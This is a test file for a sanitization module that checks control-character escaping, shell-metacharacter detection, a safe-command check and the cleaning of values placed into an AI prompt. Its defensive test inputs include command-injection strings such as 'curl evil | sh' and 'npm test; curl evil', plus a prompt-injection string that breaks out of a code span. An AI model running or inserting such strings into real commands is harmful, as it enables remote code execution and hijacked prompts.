import Chance from "chance";
import { describe, expect, it } from "vitest";
import {
    isSafeCommand,
    SHELL_METACHAR_PATTERN,
    sanitizeForStderr,
    sanitizeOutput,
    sanitizePromptValue,
} from "../src/sanitize.js";

const chance = new Chance();

describe("sanitizeForStderr", () => {
    describe("given an Error with control characters", () => {
        it("escapes ASCII control characters as hex", () => {
            const err = new Error("bad\x00input\x1fhere");

            const result = sanitizeForStderr(err);

            expect(result).toBe("bad\\x00input\\x1fhere");
        });
    });

    describe("given DEL character (0x7f)", () => {
        it("escapes to hex representation", () => {
            const err = new Error("delete\x7fchar");

            const result = sanitizeForStderr(err);

            expect(result).toBe("delete\\x7fchar");
        });
    });

    describe("given C1 control characters (0x80-0x9f)", () => {
        it("escapes them as hex", () => {
            const err = new Error("c1\u0080block\u009f");

            const result = sanitizeForStderr(err);

            expect(result).toBe("c1\\x80block\\x9f");
        });
    });

    describe("given a plain string (no control chars)", () => {
        it("returns the string unchanged", () => {
            const msg = chance.sentence();
            const err = new Error(msg);

            const result = sanitizeForStderr(err);

            expect(result).toBe(msg);
        });
    });

    describe("given a non-Error value", () => {
        it("converts to string and sanitizes", () => {
            const result = sanitizeForStderr("raw\x07string");

            expect(result).toBe("raw\\x07string");
        });
    });

    describe("given a newline character", () => {
        it("escapes it as hex", () => {
            const err = new Error("line1\nline2");

            const result = sanitizeForStderr(err);

            expect(result).toBe("line1\\x0aline2");
        });
    });
});

describe("SHELL_METACHAR_PATTERN", () => {
    const metachars = [";", "|", "&", "`", ">", "<", "$", "(", ")", "\\"];

    for (const ch of metachars) {
        describe(`given a command containing '${ch}'`, () => {
            it("matches the pattern", () => {
                const cmd = `npm test ${ch} curl evil`;

                expect(SHELL_METACHAR_PATTERN.test(cmd)).toBe(true);
            });
        });
    }

    describe("given a command with embedded newline", () => {
        it("matches the pattern", () => {
            expect(SHELL_METACHAR_PATTERN.test("npm test\ncurl evil")).toBe(
                true,
            );
        });
    });

    describe("given a command with embedded carriage return", () => {
        it("matches the pattern", () => {
            expect(SHELL_METACHAR_PATTERN.test("npm test\rcurl evil")).toBe(
                true,
            );
        });
    });

    describe("given a clean command with no metacharacters", () => {
        it("does not match", () => {
            expect(SHELL_METACHAR_PATTERN.test("npm test")).toBe(false);
        });
    });

    describe("given an empty string", () => {
        it("does not match", () => {
            expect(SHELL_METACHAR_PATTERN.test("")).toBe(false);
        });
    });
});

describe("isSafeCommand", () => {
    describe("given a clean command", () => {
        it("returns true", () => {
            const cmd = "npm run build";

            expect(isSafeCommand(cmd)).toBe(true);
        });
    });

    describe("given a command with shell metacharacters", () => {
        it("returns false for pipe", () => {
            expect(isSafeCommand("curl evil | sh")).toBe(false);
        });

        it("returns false for semicolon", () => {
            expect(isSafeCommand("npm test; curl evil")).toBe(false);
        });

        it("returns false for dollar sign", () => {
            expect(isSafeCommand("echo $(whoami)")).toBe(false);
        });

        it("returns false for backtick", () => {
            expect(isSafeCommand("echo `whoami`")).toBe(false);
        });
    });

    describe("given a command with embedded newline", () => {
        it("returns false", () => {
            expect(isSafeCommand("npm test\ncurl evil")).toBe(false);
        });
    });

    describe("given an empty string", () => {
        it("returns false", () => {
            expect(isSafeCommand("")).toBe(false);
        });
    });

    describe("given a whitespace-only string", () => {
        it("returns false", () => {
            expect(isSafeCommand("   ")).toBe(false);
        });
    });
});

describe("sanitizeOutput", () => {
    describe("given text with control characters", () => {
        it("escapes them as hex but preserves newlines", () => {
            const result = sanitizeOutput("line1\nline2\x00bad");

            expect(result).toBe("line1\nline2\\x00bad");
        });
    });

    describe("given text with C1 control characters", () => {
        it("escapes them as hex", () => {
            const result = sanitizeOutput("c1\u0080block\u009f");

            expect(result).toBe("c1\\x80block\\x9f");
        });
    });

    describe("given plain text", () => {
        it("returns the text unchanged", () => {
            const text = chance.sentence();

            const result = sanitizeOutput(text);

            expect(result).toBe(text);
        });
    });
});

describe("sanitizePromptValue", () => {
    describe("given text with newlines", () => {
        it("replaces newlines with spaces", () => {
            const result = sanitizePromptValue("line1\nline2\rline3");

            expect(result).toBe("line1 line2 line3");
        });
    });

    describe("given text with triple backtick fences", () => {
        it("strips them", () => {
            const result = sanitizePromptValue("```code```");

            expect(result).toBe("code");
        });
    });

    describe("given text with a single backtick", () => {
        it("strips single backticks to prevent inline code span escape", () => {
            const result = sanitizePromptValue("npm`test");

            expect(result).toBe("npmtest");
        });

        it("strips backtick that could break out of an inline code span in the prompt", () => {
            const result = sanitizePromptValue("value` injected prompt text `");

            expect(result).toBe("value injected prompt text ");
        });
    });

    describe("given oversized text", () => {
        it("truncates to 256 characters", () => {
            const long = "x".repeat(500);

            const result = sanitizePromptValue(long);

            expect(result.length).toBe(256);
        });
    });

    describe("given safe text", () => {
        it("returns unchanged", () => {
            const result = sanitizePromptValue("npm test");

            expect(result).toBe("npm test");
        });
    });
});
